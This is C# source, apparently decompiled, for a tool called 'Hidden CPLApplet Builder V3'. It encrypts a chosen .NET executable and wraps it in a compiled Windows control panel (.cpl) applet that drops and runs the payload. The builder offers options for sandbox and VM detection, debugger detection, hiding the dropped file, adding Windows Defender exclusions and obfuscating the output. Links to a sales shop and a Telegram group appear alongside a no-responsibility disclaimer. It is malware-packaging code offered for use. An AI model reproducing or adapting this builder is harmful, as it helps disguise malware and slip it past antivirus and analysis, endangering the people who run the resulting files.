using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SimpleObfuscator;
using HiddenCPLApplet_V3;
using HiddenCPLApplet_V3.Properties;
using HiddenCPLApplet;

namespace HiddenCPLApplet
{
     [DesignerGenerated]

  public partial class Form1 : Form
    {
        public static bool bool_0;

        public static string BaseDirectory = AppDomain.CurrentDomain.BaseDirectory;

        public Form1()
        {
            base.Load += Form1_Load;
            base.Activated += Form1_Activated;
            base.Deactivate += Form1_Deactivate;
            base.FormClosing += Form1_FormClosing;
            InitializeComponent();
            base.Opacity = 0.0;
            GClass0.smethod_0(this, 20);
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {

                Guna2ComboBox1.SelectedIndex = 0;
                Guna2ComboBox2.SelectedIndex = 0;
                Guna2ComboBox3.SelectedIndex = 0;
                Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch1, "AntiAnalysis [VirtualBox - Vmware - DetectDebugger - DetectSandboxie - IsXP - Anyrun]!");
                Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch2, "Hide After Writing To Path!");
                Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch3, "Simple Obfuscator!");
                Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch9, "Windows Defender Exceptions [UAC Permissions]!");
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                Debug.WriteLine(ex.Message);
                ProjectData.ClearProjectError();
            }
        }

        private void LinkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
        
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                Debug.WriteLine(ex.Message);
                ProjectData.ClearProjectError();
            }
        }

        private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
              
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                Debug.WriteLine(ex.Message);
                ProjectData.ClearProjectError();
            }
        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            try
            {
                if (bool_0)
                {
                    base.Opacity = 1.0;
                }
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                Debug.WriteLine(ex.Message);
                ProjectData.ClearProjectError();
            }
        }

        private void Form1_Deactivate(object sender, EventArgs e)
        {
            try
            {
                base.Opacity = 0.95;
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                Debug.WriteLine(ex.Message);
                ProjectData.ClearProjectError();
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                Debug.WriteLine(ex.Message);
                ProjectData.ClearProjectError();
            }
        }

        private void Guna2Panel1_Paint(object sender, PaintEventArgs e)
        {
        }

        private void Guna2Button1_Click_1(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                openFileDialog.Filter = "(*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        Assembly.LoadFile(openFileDialog.FileName).EntryPoint.GetParameters();
                    }
                    catch (Exception projectError)
                    {
                        ProjectData.SetProjectError(projectError);
                        MessageBox.Show(openFileDialog.FileName, "Is Not A .NET Assembly!");
                        ProjectData.ClearProjectError();
                        return;
                    }
                    Guna2TextBox2.Text = openFileDialog.FileName;
                    string left = method_0(openFileDialog.FileName);
                    if ((Operators.CompareString(left, "V4.0", TextCompare: false) == 0) | (Operators.CompareString(left, "V2.0", TextCompare: false) == 0))
                    {
                        Guna2ComboBox2.Text = left;
                    }
                    GC.Collect();
                }
                else
                {
                    Guna2TextBox2.Text = "...";
                }
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                Exception ex2 = ex;
                Guna2TextBox2.Text = "...";
                MessageBox.Show(ex2.Message);
                ProjectData.ClearProjectError();
            }
        }

        public string method_0(string P)
        {
            string result = default(string);
            try
            {
                result = Assembly.LoadFile(P).ImageRuntimeVersion.Substring(0, 4).ToUpper();
                return result;
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                Debug.WriteLine(ex.Message);
                ProjectData.ClearProjectError();
            }
            return result;
        }

        private void Guna2Button3_Click_1(object sender, EventArgs e)
        {
            checked
            {
                if ((Operators.CompareString(Guna2TextBox2.Text, "...", TextCompare: false) == 0) | string.IsNullOrEmpty(Guna2TextBox1.Text))
                {
                    try
                    {
                        int num = 0;
                        do
                        {
                            base.Left = base.DesktopLocation.X + 30;
                            Thread.Sleep(40);
                            base.Left = base.DesktopLocation.X - 30;
                            Thread.Sleep(40);
                            num++;
                        }
                        while (num <= 2);
                        return;
                    }
                    catch (Exception ex)
                    {
                        ProjectData.SetProjectError(ex);
                        Debug.WriteLine(ex.Message);
                        ProjectData.ClearProjectError();
                        return;
                    }
                }
                try
                {
                    SaveFileDialog saveFileDialog = new SaveFileDialog();
                    saveFileDialog.Filter = "(*.cpl)|*.cpl";
                    saveFileDialog.FileName = "CPLApplet.cpl";
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        Guna2Button3.Text = "Wait...";
                        Guna2Button3.Enabled = false;
                        string text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
                        StringBuilder stringBuilder = new StringBuilder();
                        Random random = new Random();
                        int num2 = 1;
                        do
                        {
                            int index = random.Next(0, text.Length);
                            char value = text[index];
                            stringBuilder.Append(value);
                            num2++;
                        }
                        while (num2 <= 16);
                        string text2 = stringBuilder.ToString();
                        string text3 = File.ReadAllText(BaseDirectory + "Stub\\CPLApplet\\AssemblyInfo.vb.backup");
                        string text4 = File.ReadAllText(BaseDirectory + "Stub\\CPLApplet\\CPLApplet.vbproj.backup");
                        string text5 = File.ReadAllText(BaseDirectory + "Stub\\CPLApplet\\Test.vb.backup");
                        string text6 = File.ReadAllText(BaseDirectory + "Stub\\CPLApplet\\Analysis.vb.backup");
                        string text7 = File.ReadAllText(BaseDirectory + "Stub\\CPLApplet\\Exclusion.vb.backup");
                        StreamWriter streamWriter = new StreamWriter(BaseDirectory + "Stub\\CPLApplet\\AssemblyInfo.vb", append: false);
                        streamWriter.WriteLine(text3.Replace("%Guid%", Guid.NewGuid().ToString()));
                        streamWriter.Close();
                        StreamWriter streamWriter2 = new StreamWriter(BaseDirectory + "Stub\\CPLApplet\\Analysis.vb", append: false);
                        if (Guna2ToggleSwitch3.Checked)
                        {
                            text6 = Conversions.ToString(GClass0.smethod_2(text6));
                        }
                        streamWriter2.WriteLine(text6);
                        streamWriter2.Close();
                        StreamWriter streamWriter3 = new StreamWriter(BaseDirectory + "Stub\\CPLApplet\\Exclusion.vb", append: false);
                        if (Guna2ToggleSwitch3.Checked)
                        {
                            text7 = Conversions.ToString(GClass0.smethod_2(text7));
                        }
                        streamWriter3.WriteLine(text7);
                        streamWriter3.Close();
                        StreamWriter streamWriter4 = new StreamWriter(BaseDirectory + "Stub\\CPLApplet\\CPLApplet.vbproj", append: false);
                        text4 = text4.Replace("%NET%", Guna2ComboBox2.Text);
                        text4 = ((!Guna2ToggleSwitch9.Checked) ? text4.Replace("%Exclusion%", "") : text4.Replace("%Exclusion%", "<Compile Include=\"Exclusion.vb\" />"));
                        text4 = ((!Guna2ToggleSwitch1.Checked) ? text4.Replace("%Analysis%", "") : text4.Replace("%Analysis%", "<Compile Include=\"Analysis.vb\" />"));
                        streamWriter4.WriteLine(text4);
                        streamWriter4.Close();
                        StreamWriter streamWriter5 = new StreamWriter(BaseDirectory + "Stub\\CPLApplet\\Test.vb", append: false);
                        text5 = text5.Replace("%KEY%", text2).Replace("%FileName%", Guna2TextBox1.Text).Replace("%Path%", Guna2ComboBox3.Text);
                        if (Guna2ToggleSwitch1.Checked)
                        {
                            text5 = text5.Replace("'AntiAnalysi", "");
                        }
                        if (Guna2ToggleSwitch2.Checked)
                        {
                            text5 = text5.Replace("'SuperHidden", "");
                        }
                        if (Guna2ToggleSwitch9.Checked)
                        {
                            text5 = text5.Replace("'WDExclusion", "");
                        }
                        StringBuilder stringBuilder2 = new StringBuilder();
                        Random random2 = new Random();
                        int num3 = new Random().Next(4, 10);
                        for (int i = 1; i <= num3; i++)
                        {
                            int index2 = random2.Next(0, text.Length);
                            char value2 = text[index2];
                            stringBuilder2.Append(value2);
                        }
                        text5 = text5.Replace("%Runtime%", stringBuilder2.ToString());
                        if (Guna2ToggleSwitch3.Checked)
                        {
                            text5 = Conversions.ToString(GClass0.smethod_2(text5));
                        }
                        streamWriter5.WriteLine(text5);
                        streamWriter5.Close();
                        File.WriteAllBytes(BaseDirectory + "Stub\\CPLApplet\\Buffer", smethod_1(File.ReadAllBytes(Guna2TextBox2.Text), text2));
                        Process.Start(Interaction.Environ("WinDir") + "\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe", "\"" + BaseDirectory + "Stub\\CPLApplet\\CPLApplet.vbproj\" \"/p:TargetFrameworkSDKToolsDirectory=" + BaseDirectory + "Stub\\SDKs\"").WaitForExit();
                        File.WriteAllBytes(saveFileDialog.FileName, File.ReadAllBytes(BaseDirectory + "Stub\\CPLApplet\\OutPut\\" + Guna2ComboBox1.Text + "\\CPLApplet.dll"));
                        if (Guna2ToggleSwitch3.Checked)
                        {
                            Debug.WriteLine(Obfuscator.Save(File.ReadAllBytes(saveFileDialog.FileName), saveFileDialog.FileName));
                        }
                        smethod_0();
                        Guna2Button3.Text = "Build";
                        Guna2Button3.Enabled = true;
                        FileInfo fileInfo = new FileInfo(saveFileDialog.FileName);
                        MessageBox.Show(saveFileDialog.FileName, "DONE! : " + GClass0.smethod_4(fileInfo.Length));
                    }
                }
                catch (Exception ex2)
                {
                    ProjectData.SetProjectError(ex2);
                    Exception ex3 = ex2;
                    Guna2Button3.Text = "Build";
                    Guna2Button3.Enabled = true;
                    MessageBox.Show(ex3.Message);
                    ProjectData.ClearProjectError();
                }
            }
        }

        public static object smethod_0()
        {
            int try0001_dispatch = -1;
            int num3 = default(int);
            int num2 = default(int);
            int num = default(int);
            while (true)
            {
                try
                {
                    /*Note:Smikey has introduced the following switch to emulate a goto from catch-block to try-block*/
                    ;
                    switch (try0001_dispatch)
                    {
                        default:
                            ProjectData.ClearProjectError();
                            num3 = -2;
                            goto IL_000a;
                        case 286:
                            {
                                num2 = num;
                                if (num3 > -2)
                                {
                                    switch (num3)
                                    {
                                        case 1:
                                            break;
                                        default:
                                            goto end_IL_0001;
                                    }
                                }
                                int num4 = num2 + 1;
                                num2 = 0;
                                switch (num4)
                                {
                                    case 1:
                                        break;
                                    case 2:
                                        goto IL_000a;
                                    case 3:
                                        goto IL_0020;
                                    case 4:
                                        goto IL_0036;
                                    case 5:
                                        goto IL_004c;
                                    case 6:
                                        goto IL_0062;
                                    case 7:
                                        goto IL_0078;
                                    case 8:
                                        goto IL_008e;
                                    case 9:
                                        goto IL_00a5;
                                    case 10:
                                        goto IL_00bd;
                                    case 11:
                                        goto IL_00c5;
                                    case 12:
                                        goto end_IL_0001_2;
                                    default:
                                        goto end_IL_0001;
                                    case 13:
                                        goto end_IL_0001_3;
                                }
                                goto default;
                            }
                        IL_00c5:
                            num = 11;
                            GC.WaitForPendingFinalizers();
                            break;
                        IL_00bd:
                            num = 10;
                            GC.Collect();
                            goto IL_00c5;
                        IL_000a:
                            num = 2;
                            File.Delete(BaseDirectory + "Stub\\CPLApplet\\AssemblyInfo.vb");
                            goto IL_0020;
                        IL_0020:
                            num = 3;
                            File.Delete(BaseDirectory + "Stub\\CPLApplet\\CPLApplet.vbproj");
                            goto IL_0036;
                        IL_0036:
                            num = 4;
                            File.Delete(BaseDirectory + "Stub\\CPLApplet\\Test.vb");
                            goto IL_004c;
                        IL_004c:
                            num = 5;
                            File.Delete(BaseDirectory + "Stub\\CPLApplet\\Analysis.vb");
                            goto IL_0062;
                        IL_0062:
                            num = 6;
                            File.Delete(BaseDirectory + "Stub\\CPLApplet\\Exclusion.vb");
                            goto IL_0078;
                        IL_0078:
                            num = 7;
                            File.Delete(BaseDirectory + "Stub\\CPLApplet\\Buffer");
                            goto IL_008e;
                        IL_008e:
                            num = 8;
                            Directory.Delete(BaseDirectory + "Stub\\CPLApplet\\obj", recursive: true);
                            goto IL_00a5;
                        IL_00a5:
                            num = 9;
                            Directory.Delete(BaseDirectory + "Stub\\CPLApplet\\OutPut", recursive: true);
                            goto IL_00bd;
                        end_IL_0001_2:
                            break;
                    }
                    num = 12;
                    GC.Collect();
                    break;
                end_IL_0001:;
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError((Exception);
                    try0001_dispatch = 286;
                    continue;
                }
                throw ProjectData.CreateProjectError(-2146828237);
                continue;
            end_IL_0001_3:
                break;
            }
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
            object result = default(object);
            return result;
        }

        public static byte[] smethod_1(byte[] input, string Pass)
        {
            byte[] result = default(byte[]);
            try
            {
                RijndaelManaged rijndaelManaged = new RijndaelManaged();
                MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
                rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(smethod_2(Pass));
                rijndaelManaged.Mode = CipherMode.ECB;
                ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
                result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
                return result;
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                Debug.WriteLine(ex.Message);
                ProjectData.ClearProjectError();
            }
            return result;
        }

        public static byte[] smethod_2(string s)
        {
            return Encoding.UTF8.GetBytes(s);
        }

        private void Guna2TextBox2_TextChanged(object sender, EventArgs e)
        {
        }

        private void Guna2TextBox2_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                e.Effect = DragDropEffects.Copy;
            }
        }

        private void Guna2TextBox2_DragDrop(object sender, DragEventArgs e)
        {
            string[] array = (string[])e.Data.GetData(DataFormats.FileDrop);
            foreach (string text in array)
            {
                if (!File.Exists(text))
                {
                    continue;
                }
                try
                {
                    Assembly.LoadFile(text).EntryPoint.GetParameters();
                    string left = method_0(text);
                    if ((Operators.CompareString(left, "V4.0", TextCompare: false) == 0) | (Operators.CompareString(left, "V2.0", TextCompare: false) == 0))
                    {
                        Guna2ComboBox2.Text = left;
                    }
                    Guna2TextBox2.Text = text;
                }
                catch (Exception projectError)
                {
                    ProjectData.SetProjectError(projectError);
                    Guna2TextBox2.Text = "...";
                    MessageBox.Show(text, "Is Not A .NET Assembly!");
                    ProjectData.ClearProjectError();
                    break;
                }
            }
        }
        [DebuggerNonUserCode]
        [System.Diagnostics.DebuggerStepThrough]
        public static string smethod_3()
        {
            return " @";
        }

        public static string smethod_4()
        {
            return "AntiAnalysis [VirtualBox - Vmware - DetectDebugger - DetectSandboxie - IsXP - Anyrun]!";
        }

        public static string smethod_5()
        {
            return "Hide After Writing To Path!";
        }

        public static string smethod_6()
        {
            return "Simple Obfuscator!";
        }

        public static string smethod_7()
        {
            return "Windows Defender Exceptions [UAC Permissions]!";
        }

        public static string smethod_8()
        {
            return "(*.exe)|*.exe";
        }

        public static string smethod_9()
        {
            return "Is Not A .NET Assembly!";
        }

        public static string smethod_10()
        {
            return "V4.0";
        }

        public static string smethod_11()
        {
            return "V2.0";
        }

        public static string smethod_12()
        {
            return "...";
        }

        public static string smethod_13()
        {
            return "...";
        }

        public static string smethod_14()
        {
            return "...";
        }

        public static string smethod_15()
        {
            return "(*.cpl)|*.cpl";
        }

        public static string smethod_16()
        {
            return "CPLApplet.cpl";
        }

        public static string smethod_17()
        {
            return "Wait...";
        }

        public static string smethod_18()
        {
            return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        }

        public static string smethod_19()
        {
            return "Stub\\CPLApplet\\AssemblyInfo.vb.backup";
        }

        public static string smethod_20()
        {
            return "Stub\\CPLApplet\\CPLApplet.vbproj.backup";
        }

        public static string smethod_21()
        {
            return "Stub\\CPLApplet\\Test.vb.backup";
        }

        public static string smethod_22()
        {
            return "Stub\\CPLApplet\\Analysis.vb.backup";
        }

        public static string smethod_23()
        {
            return "Stub\\CPLApplet\\Exclusion.vb.backup";
        }

        public static string smethod_24()
        {
            return "Stub\\CPLApplet\\AssemblyInfo.vb";
        }

        public static string smethod_25()
        {
            return "%Guid%";
        }

        public static string smethod_26()
        {
            return "Stub\\CPLApplet\\Analysis.vb";
        }

        public static string smethod_27()
        {
            return "Stub\\CPLApplet\\Exclusion.vb";
        }

        public static string smethod_28()
        {
            return "Stub\\CPLApplet\\CPLApplet.vbproj";
        }

        public static string smethod_29()
        {
            return "%NET%";
        }

        public static string smethod_30()
        {
            return "%Exclusion%";
        }

        public static string smethod_31()
        {
            return "<Compile Include=\"Exclusion.vb\" />";
        }

        public static string smethod_32()
        {
            return "%Exclusion%";
        }

        public static string smethod_33()
        {
            return "";
        }

        public static string smethod_34()
        {
            return "%Analysis%";
        }

        public static string smethod_35()
        {
            return "<Compile Include=\"Analysis.vb\" />";
        }

        public static string smethod_36()
        {
            return "%Analysis%";
        }

        public static string smethod_37()
        {
            return "";
        }

        public static string smethod_38()
        {
            return "Stub\\CPLApplet\\Test.vb";
        }

        public static string smethod_39()
        {
            return "%KEY%";
        }

        public static string smethod_40()
        {
            return "%FileName%";
        }

        public static string smethod_41()
        {
            return "%Path%";
        }

        public static string smethod_42()
        {
            return "'AntiAnalysi";
        }

        public static string smethod_43()
        {
            return "";
        }

        public static string smethod_44()
        {
            return "'SuperHidden";
        }

        public static string smethod_45()
        {
            return "";
        }

        public static string smethod_46()
        {
            return "'WDExclusion";
        }

        public static string smethod_47()
        {
            return "";
        }

        public static string smethod_48()
        {
            return "%Runtime%";
        }

        public static string smethod_49()
        {
            return "Stub\\CPLApplet\\Buffer";
        }

        public static string smethod_50()
        {
            return "WinDir";
        }

        public static string smethod_51()
        {
            return "\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe";
        }

        public static string smethod_52()
        {
            return "\"";
        }

        public static string smethod_53()
        {
            return "Stub\\CPLApplet\\CPLApplet.vbproj\" \"/p:TargetFrameworkSDKToolsDirectory=";
        }

        public static string smethod_54()
        {
            return "Stub\\SDKs\"";
        }

        public static string smethod_55()
        {
            return "Stub\\CPLApplet\\OutPut\\";
        }

        public static string smethod_56()
        {
            return "\\CPLApplet.dll";
        }

        public static string smethod_57()
        {
            return "Build";
        }

        public static string smethod_58()
        {
            return "DONE! : ";
        }

        public static string smethod_59()
        {
            return "Build";
        }

        public static string smethod_60()
        {
            return "Stub\\CPLApplet\\AssemblyInfo.vb";
        }

        public static string smethod_61()
        {
            return "Stub\\CPLApplet\\CPLApplet.vbproj";
        }

        public static string smethod_62()
        {
            return "Stub\\CPLApplet\\Test.vb";
        }

        public static string smethod_63()
        {
            return "Stub\\CPLApplet\\Analysis.vb";
        }

        public static string smethod_64()
        {
            return "Stub\\CPLApplet\\Exclusion.vb";
        }

        public static string smethod_65()
        {
            return "Stub\\CPLApplet\\Buffer";
        }

        public static string smethod_66()
        {
            return "Stub\\CPLApplet\\obj";
        }

        public static string smethod_67()
        {
            return "Stub\\CPLApplet\\OutPut";
        }

        public static string smethod_68()
        {
            return "";
        }

        public static string smethod_69()
        {
            return "V4.0";
        }

        public static string smethod_70()
        {
            return "V2.0";
        }

        public static string smethod_71()
        {
            return "...";
        }

        public static string smethod_72()
        {
            return "Is Not A .NET Assembly!";
        }

        public static string smethod_73()
        {
            return "Guna2ToggleSwitch1";
        }

        public static string smethod_74()
        {
            return "Guna2ComboBox2";
        }

        public static string smethod_75()
        {
            return "WD_Exclusion";
        }

        public static string smethod_76()
        {
            return "Build";
        }

        public static string smethod_77()
        {
            return "Label3";
        }

        public static string smethod_78()
        {
            return "Guna2ControlBox3";
        }

        public static string smethod_79()
        {
            return "573961.png";
        }

        public static string smethod_80()
        {
            return "Obfuscator";
        }

        public static string smethod_81()
        {
            return "Segoe UI";
        }

        public static string smethod_82()
        {
            return "Segoe UI";
        }

        public static string smethod_83()
        {
            return "Guna2ComboBox1";
        }

        public static string smethod_84()
        {
            return "Segoe UI";
        }

        public static string smethod_85()
        {
            return "InstallDir :";
        }

        public static string smethod_86()
        {
            return "Guna2TextBox2";
        }

        public static string smethod_87()
        {
            return "Assembly :";
        }

        public static string smethod_88()
        {
            return "TabPage2";
        }

        public static string smethod_89()
        {
            return "PictureBox3";
        }

        public static string smethod_90()
        {
            return "Tahoma";
        }

        public static string smethod_91()
        {
            return "Label2";
        }

        public static string smethod_92()
        {
            return "[ Size ]";
        }

        public static string smethod_93()
        {
            return "Guna2Panel1";
        }

        public static string smethod_94()
        {
            return "Tahoma";
        }

        public static string smethod_95()
        {
            return "Label6";
        }

        public static string smethod_96()
        {
            return "TabPage1";
        }

        public static string smethod_97()
        {
            return "Builder";
        }

        public static string smethod_98()
        {
            return "Label13";
        }

        public static string smethod_99()
        {
            return "Guna2ToggleSwitch3";
        }

        public static string smethod_100()
        {
            return "Label12";
        }

        public static string smethod_101()
        {
            return ".Net :";
        }

        public static string smethod_102()
        {
            return "v4.0";
        }

        public static string smethod_103()
        {
            return "v2.0";
        }

        public static string smethod_104()
        {
            return "Label11";
        }

        public static string smethod_105()
        {
            return "Bit :";
        }

        public static string smethod_106()
        {
            return "x64";
        }

        public static string smethod_107()
        {
            return "x86";
        }

        public static string smethod_108()
        {
            return "Label10";
        }

        public static string smethod_109()
        {
            return "Super_Hidden";
        }

        public static string smethod_110()
        {
            return "Guna2ToggleSwitch2";
        }

        public static string smethod_111()
        {
            return "Label9";
        }

        public static string smethod_112()
        {
            return "Anti_Analysis";
        }

        public static string smethod_113()
        {
            return "Label18";
        }

        public static string smethod_114()
        {
            return "Guna2ToggleSwitch9";
        }

        public static string smethod_115()
        {
            return "Guna2Button3.Image";
        }

        public static string smethod_116()
        {
            return "Guna2Button3";
        }

        public static string smethod_117()
        {
            return "Segoe UI";
        }

        public static string smethod_118()
        {
            return "%Temp%";
        }

        public static string smethod_119()
        {
            return "%AppData%";
        }

        public static string smethod_120()
        {
            return "%LocalAppData%";
        }

        public static string smethod_121()
        {
            return "%Userprofile%";
        }

        public static string smethod_122()
        {
            return "%Public%";
        }

        public static string smethod_123()
        {
            return "%ProgramData%";
        }

        public static string smethod_124()
        {
            return "Guna2ComboBox3";
        }

        public static string smethod_125()
        {
            return "CPLApplet.dll";
        }

        public static string smethod_126()
        {
            return "Segoe UI";
        }

        public static string smethod_127()
        {
            return "Guna2TextBox1";
        }

        public static string smethod_128()
        {
            return "";
        }

        public static string smethod_129()
        {
            return "";
        }

        public static string smethod_130()
        {
            return "Label8";
        }

        public static string smethod_131()
        {
            return "Segoe UI";
        }

        public static string smethod_132()
        {
            return "Guna2Button1";
        }

        public static string smethod_133()
        {
            return "Open";
        }

        public static string smethod_134()
        {
            return "...";
        }

        public static string smethod_135()
        {
            return "Segoe UI";
        }

        public static string smethod_136()
        {
            return "";
        }

        public static string smethod_137()
        {
            return "";
        }

        public static string smethod_138()
        {
            return "Label7";
        }

        public static string smethod_139()
        {
            return "Guna2TabControl1";
        }

        public static string smethod_140()
        {
            return "exclamation-mark-2.png";
        }

        public static string smethod_141()
        {
            return "About";
        }

        public static string smethod_142()
        {
            return "PictureBox2.Image";
        }

        public static string smethod_143()
        {
            return "PictureBox2";
        }

        public static string smethod_144()
        {
            return "Label5";
        }

        public static string smethod_145()
        {
            return "I am not responsible for your actions!";
        }

        public static string smethod_146()
        {
            return "Segoe UI Semibold";
        }

        public static string smethod_147()
        {
            return "PictureBox3.Image";
        }

        public static string smethod_148()
        {
            return "LinkLabel1";
        }

        public static string smethod_149()
        {
            return "https://evilcoder.sellix.io";
        }

        public static string smethod_150()
        {
            return "LinkLabel2";
        }

        public static string smethod_151()
        {
            return "https://t.me/XCoderGroup";
        }

        public static string smethod_152()
        {
            return "Segoe UI Semibold";
        }

        public static string smethod_153()
        {
            return "Label4";
        }

        public static string smethod_154()
        {
            return "Shop :";
        }

        public static string smethod_155()
        {
            return "Tahoma";
        }

        public static string smethod_156()
        {
            return "Label1";
        }

        public static string smethod_157()
        {
            return "| Hidden CPLApplet |";
        }

        public static string smethod_158()
        {
            return "Group :";
        }

        public static string smethod_159()
        {
            return "Segoe UI Semibold";
        }

        public static string smethod_160()
        {
            return "Coded By XCoder";
        }

        public static string smethod_161()
        {
            return "ImageList2.ImageStream";
        }

        public static string smethod_162()
        {
            return "573961.png";
        }

        public static string smethod_163()
        {
            return "exclamation-mark-2.png";
        }

        public static string smethod_164()
        {
            return "[ Path ]";
        }

        public static string smethod_165()
        {
            return "[ .Net ]";
        }

        public static string smethod_166()
        {
            return "[ Platform ]";
        }

        public static string smethod_167()
        {
            return "Guna2ControlBox1";
        }

        public static string smethod_168()
        {
            return "PictureBox1.Image";
        }

        public static string smethod_169()
        {
            return "PictureBox1";
        }

        public static string smethod_170()
        {
            return "Hidden CPLApplet V3";
        }

        public static string smethod_171()
        {
            return "$this.Icon";
        }

        public static string smethod_172()
        {
            return "Form1";
        }

        public static string smethod_173()
        {
            return "CPLApplet Builder V3";
        }
    }
}
